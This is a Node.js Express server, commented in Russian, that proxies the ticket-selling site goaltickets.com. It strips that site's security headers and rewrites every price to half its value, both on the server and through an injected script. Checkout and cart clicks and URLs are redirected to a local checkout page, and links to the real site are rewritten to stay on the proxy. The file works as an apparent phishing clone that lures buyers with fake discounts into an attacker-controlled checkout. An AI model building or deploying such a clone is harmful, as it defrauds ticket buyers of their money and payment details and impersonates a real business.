const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: true,
  credentials: true
}));

// Кэширование статических файлов
app.use(express.static('index_files', {
  maxAge: '1d',
  etag: false
}));

// Логирование только важных запросов
app.use((req, res, next) => {
  if (!req.url.includes('/cdn/') && !req.url.includes('/api/')) {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  }
  next();
});

// Обработка статических файлов локально
app.get('/index_files/*', (req, res, next) => {
  // Если файл есть локально, отдаем его
  next();
});

// 🎯 ПЕРЕХВАТ CHECKOUT СТРАНИЦ
app.get('/checkout*', (req, res) => {
  console.log('🎯 Checkout intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

app.get('/cart', (req, res) => {
  console.log('🎯 Cart page intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

// Перехватываем все возможные варианты checkout
app.get('*checkout*', (req, res) => {
  console.log('🎯 Checkout variant intercepted:', req.url);
  res.sendFile(__dirname + '/checkout.html');
});

    // Перехватываем внешние ссылки на checkout
    app.get('/checkouts/*', (req, res) => {
      console.log('🎯 External checkout intercepted:', req.url);
      res.sendFile(__dirname + '/checkout.html');
    });

    // Перехватываем все страницы событий
    app.get('/products/*', (req, res, next) => {
      console.log('🎯 Product page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

    app.get('/collections/*', (req, res, next) => {
      console.log('🎯 Collection page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

    app.get('/events/*', (req, res, next) => {
      console.log('🎯 Event page intercepted:', req.url);
      // Проксируем к оригинальному сайту, но с нашими модификациями
      next();
    });

// Обработка POST запросов (возвращаем 200 для избежания ошибок)
app.post('/api/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Обработка POST запросов к корзине
app.post('/cart', (req, res) => {
  console.log('🛒 Cart POST intercepted:', req.url);
  // Перенаправляем на checkout страницу вместо JSON
  res.redirect('/checkout');
});

app.post('/cart/*', (req, res) => {
  // Если это запрос на добавление в корзину, обрабатываем как обычно
  if (req.url.includes('add') || req.url.includes('update')) {
    console.log('🛒 Cart action intercepted:', req.url);
    // Проксируем к оригинальному сайту для обработки
    const { createProxyMiddleware } = require('http-proxy-middleware');
    const cartProxy = createProxyMiddleware({
      target: 'https://goaltickets.com',
      changeOrigin: true,
      secure: true,
      onProxyRes: (proxyRes, req, res) => {
        // После успешного добавления в корзину, перенаправляем на checkout
        if (proxyRes.statusCode === 200) {
          res.redirect('/checkout');
        }
      }
    });
    cartProxy(req, res);
  } else {
    res.status(200).json({ success: true });
  }
});

// Обработка POST запросов к checkout
app.post('/checkout*', (req, res) => {
  console.log('🎯 Checkout POST intercepted:', req.url);
  // Перенаправляем на checkout страницу вместо JSON
  res.redirect('/checkout');
});

app.post('/.well-known/*', (req, res) => {
  res.status(200).json({ success: true });
});

// Настройка прокси только для HTML страниц
const proxyOptions = {
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  timeout: 10000, // 10 секунд таймаут
  proxyTimeout: 10000,
  onProxyReq: (proxyReq, req, res) => {
    proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    proxyReq.setHeader('Accept-Language', 'en-US,en;q=0.5');
    proxyReq.setHeader('Accept-Encoding', 'gzip, deflate, br');
    proxyReq.setHeader('Connection', 'keep-alive');
    proxyReq.setHeader('Cache-Control', 'no-cache');
  },
  onProxyRes: (proxyRes, req, res) => {
    // Удаляем проблемные заголовки
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['x-content-type-options'];
    delete proxyRes.headers['referrer-policy'];
    
    // Добавляем кэширование
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
    }
    
    // Добавляем CORS
    proxyRes.headers['Access-Control-Allow-Origin'] = '*';
    proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With';
    
    // Инжектируем скрипт перехвата checkout
    if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
      let body = '';
      proxyRes.on('data', (chunk) => {
        body += chunk;
      });
      
      proxyRes.on('end', () => {
        // Изменяем цены в HTML - делим на 2
        let modifiedBody = body;
        
        // Ищем и заменяем цены в различных форматах
        const pricePatterns = [
          // USD $3,500.00 -> $1,750.00
          /\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          // USD 3500.00 -> 1750.00
          /USD\s+(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          // 3500.00 USD -> 1750.00 USD
          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s+USD/g,
          // Цены в скобках (USD $3,500.00)
          /\(USD\s+\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\)/g,
          // Цены в data атрибутах
          /data-price="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
          // Цены в JSON
          /"price":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          // Цены в span с классом price
          /<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/span>/g,
          // Цены в div с классом price
          /<div[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/div>/g,
          // Цены в p с классом price
          /<p[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/p>/g,
          // Цены в strong с классом price
          /<strong[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/strong>/g,
          // Цены в h1-h6 с классом price
          /<h[1-6][^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/h[1-6]>/g,
          // Цены в любом элементе с классом содержащим price
          /<[^>]*class="[^"]*price[^"]*"[^>]*>\s*\$?(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*<\/[^>]*>/g,
          // Цены в data атрибутах с разными именами
          /data-amount="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
          /data-cost="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
          /data-value="(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)"/g,
          // Цены в JSON с разными ключами
          /"amount":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          /"cost":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          /"value":\s*(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/g,
          // Цены в тексте без символа доллара
          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g,
          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*per\s+ticket/g,
          // Цены в формате "900.00 /ticket"
          /(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)\s*\/ticket/g
        ];
        
        pricePatterns.forEach(pattern => {
          modifiedBody = modifiedBody.replace(pattern, (match, price) => {
            // Убираем запятые и конвертируем в число
            const cleanPrice = price.replace(/,/g, '');
            const originalPrice = parseFloat(cleanPrice);
            
            if (!isNaN(originalPrice) && originalPrice > 0) {
              // Делим на 2 и округляем до 2 знаков
              const newPrice = Math.round(originalPrice / 2 * 100) / 100;
              
              // Форматируем обратно с запятыми
              const formattedPrice = newPrice.toLocaleString('en-US', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
              });
              
              console.log(`💰 Price changed: $${price} -> $${formattedPrice}`);
              return match.replace(price, formattedPrice);
            }
            return match;
          });
        });
        
        // Добавляем скрипт перехвата перед закрывающим тегом </body>
        const checkoutScript = `
          <script>
            // 🎯 CHECKOUT INTERCEPTOR
            (function() {
              console.log('🎯 Checkout Interceptor loaded');
              
              function interceptCheckoutClicks() {
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const text = target.textContent?.toLowerCase() || '';
                  const href = target.href || '';
                  const form = target.closest('form');
                  
                  // Перехватываем все checkout кнопки и ссылки
                  if (text.includes('checkout') || text.includes('купить') || 
                      text.includes('оформить') || href.includes('checkout') ||
                      target.classList.contains('checkout') || target.id.includes('checkout') ||
                      (form && form.action && form.action.includes('cart')) ||
                      // Перехватываем внешние ссылки на goaltickets.com/checkout
                      href.includes('goaltickets.com/checkout') ||
                      href.includes('goaltickets.com/cart') ||
                      // Перехватываем любые ссылки содержащие checkout
                      (href && (href.includes('/checkout') || href.includes('/cart')))) {
                    
                    console.log('🎯 Checkout button clicked:', target, 'href:', href);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    // Показываем уведомление
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Перенаправляем на checkout...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 500);
                    
                    return false;
                  }
                });
              }
              
              // Перехватываем формы
              function interceptForms() {
                document.addEventListener('submit', function(event) {
                  const form = event.target;
                  const action = form.action?.toLowerCase() || '';
                  
                  if (action.includes('checkout')) {
                    console.log('🎯 Checkout form submission intercepted:', form);
                    event.preventDefault();
                    event.stopPropagation();
                    
                    const notification = document.createElement('div');
                    notification.innerHTML = \`
                      <div style="position:fixed;top:20px;right:20px;background:linear-gradient(45deg,#ff6b6b,#ee5a24);color:white;padding:15px 25px;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,0.3);z-index:10000;font-family:Arial,sans-serif;font-weight:bold;">
                        Обрабатываем заказ...
                      </div>
                    \`;
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                      window.location.href = '/checkout';
                    }, 1000);
                    
                    return false;
                  }
                  // Для cart форм - не перехватываем, позволяем работать нормально
                });
              }
              
              if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                  interceptCheckoutClicks();
                  interceptForms();
                });
              } else {
                interceptCheckoutClicks();
                interceptForms();
              }
              
              // Дополнительная проверка
              setTimeout(() => {
                interceptCheckoutClicks();
                interceptForms();
              }, 2000);
              
              // Перехватываем все ссылки на checkout при загрузке страницы
              function interceptAllCheckoutLinks() {
                const links = document.querySelectorAll('a[href*="checkout"], a[href*="cart"], button[onclick*="checkout"], button[onclick*="cart"]');
                links.forEach(link => {
                  if (link.href && (link.href.includes('checkout') || link.href.includes('cart'))) {
                    console.log('🎯 Found checkout link:', link);
                    link.addEventListener('click', function(e) {
                      e.preventDefault();
                      e.stopPropagation();
                      console.log('🎯 Checkout link clicked:', link.href);
                      window.location.href = '/checkout';
                      return false;
                    });
                  }
                });
              }
              
              // Запускаем перехват ссылок
              setTimeout(interceptAllCheckoutLinks, 1000);
              setTimeout(interceptAllCheckoutLinks, 3000);
              
              // 🎯 ПЕРЕХВАТ ВСЕХ ССЫЛОК НА СОБЫТИЯ
              function interceptEventLinks() {
                console.log('🔗 Intercepting event links...');
                
                // Перехватываем все ссылки на события
                document.addEventListener('click', function(event) {
                  const target = event.target;
                  const href = target.href || target.closest('a')?.href;
                  
                  if (href) {
                    // Если ссылка ведет на goaltickets.com
                    if (href.includes('goaltickets.com')) {
                      console.log('🔗 Event link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      // Извлекаем путь после домена
                      const url = new URL(href);
                      const path = url.pathname + url.search + url.hash;
                      
                      // Перенаправляем на наш прокси
                      window.location.href = path;
                      return false;
                    }
                    
                    // Если ссылка ведет на события (products, collections)
                    if (href.includes('/products/') || href.includes('/collections/') || 
                        href.includes('/events/') || href.includes('/tickets/')) {
                      console.log('🔗 Event page link intercepted:', href);
                      event.preventDefault();
                      event.stopPropagation();
                      
                      // Перенаправляем на наш прокси
                      window.location.href = href;
                      return false;
                    }
                  }
                });
                
                // Также перехватываем все ссылки при загрузке страницы
                const allLinks = document.querySelectorAll('a[href]');
                allLinks.forEach(link => {
                  const href = link.href;
                  
                  if (href.includes('goaltickets.com')) {
                    // Извлекаем путь после домена
                    const url = new URL(href);
                    const path = url.pathname + url.search + url.hash;
                    
                    // Обновляем href на наш прокси
                    link.href = path;
                    console.log('🔗 Link updated:', href, '->', path);
                  }
                });
              }
              
              // 🎯 ИЗМЕНЕНИЕ ЦЕН НА СТРАНИЦЕ
              function modifyPricesOnPage() {
                console.log('💰 Modifying prices on page...');
                
                // Ищем все элементы с ценами
                const priceSelectors = [
                  '[class*="price"]',
                  '[class*="cost"]',
                  '[class*="amount"]',
                  '[data-price]',
                  'span:contains("$")',
                  'div:contains("USD")',
                  'p:contains("$")'
                ];
                
                priceSelectors.forEach(selector => {
                  try {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(element => {
                      const text = element.textContent || element.innerText || '';
                      const priceMatch = text.match(/\$(\d{1,3}(?:,\d{3})*(?:\.\d{2})?)/);
                      
                      if (priceMatch) {
                        const originalPrice = priceMatch[1];
                        const cleanPrice = originalPrice.replace(/,/g, '');
                        const priceValue = parseFloat(cleanPrice);
                        
                        if (!isNaN(priceValue) && priceValue > 0) {
                          const newPrice = Math.round(priceValue / 2 * 100) / 100;
                          const formattedPrice = newPrice.toLocaleString('en-US', {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: 2
                          });
                          
                          const newText = text.replace(priceMatch[0], '$' + formattedPrice);
                          element.textContent = newText;
                          console.log('💰 Client price changed:', priceMatch[0], '->', '$' + formattedPrice);
                        }
                      }
                    });
                  } catch (e) {
                    // Игнорируем ошибки селекторов
                  }
                });
                
                // Также изменяем цены в data атрибутах
                const elementsWithDataPrice = document.querySelectorAll('[data-price]');
                elementsWithDataPrice.forEach(element => {
                  const price = element.getAttribute('data-price');
                  const priceValue = parseFloat(price);
                  
                  if (!isNaN(priceValue) && priceValue > 0) {
                    const newPrice = Math.round(priceValue / 2 * 100) / 100;
                    element.setAttribute('data-price', newPrice.toString());
                    console.log('💰 Data price changed:', price, '->', newPrice);
                  }
                });
              }
              
              // Запускаем перехват ссылок
              setTimeout(interceptEventLinks, 100);
              setTimeout(interceptEventLinks, 1000);
              setTimeout(interceptEventLinks, 3000);
              
              // Запускаем изменение цен
              setTimeout(modifyPricesOnPage, 500);
              setTimeout(modifyPricesOnPage, 2000);
              setTimeout(modifyPricesOnPage, 5000);
            })();
          </script>
        `;
        
        // Вставляем скрипт перед </body>
        modifiedBody = modifiedBody.replace('</body>', checkoutScript + '</body>');
        
        if (!res.headersSent) {
          res.setHeader('Content-Length', Buffer.byteLength(modifiedBody));
          res.end(modifiedBody);
        }
      });
      
      return;
    }
  },
  onError: (err, req, res) => {
    console.error('Proxy Error:', err.message);
    if (!res.headersSent) {
      res.status(500).send('Service temporarily unavailable');
    }
  }
};

// Применяем прокси только к корневой странице
app.get('/', createProxyMiddleware(proxyOptions));

// Для всех остальных GET запросов - прокси к оригинальному сайту
app.get('*', createProxyMiddleware({
  target: 'https://goaltickets.com',
  changeOrigin: true,
  secure: true,
  timeout: 5000,
  onError: (err, req, res) => {
    if (!res.headersSent) {
      res.status(404).send('Not found');
    }
  }
}));

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Server Error:', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Proxy server running on port ${PORT}`);
  console.log(`📡 Proxying requests to: https://goaltickets.com`);
  console.log(`🌐 Access your proxy at: http://localhost:${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down gracefully');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT received, shutting down gracefully');
  process.exit(0);
});
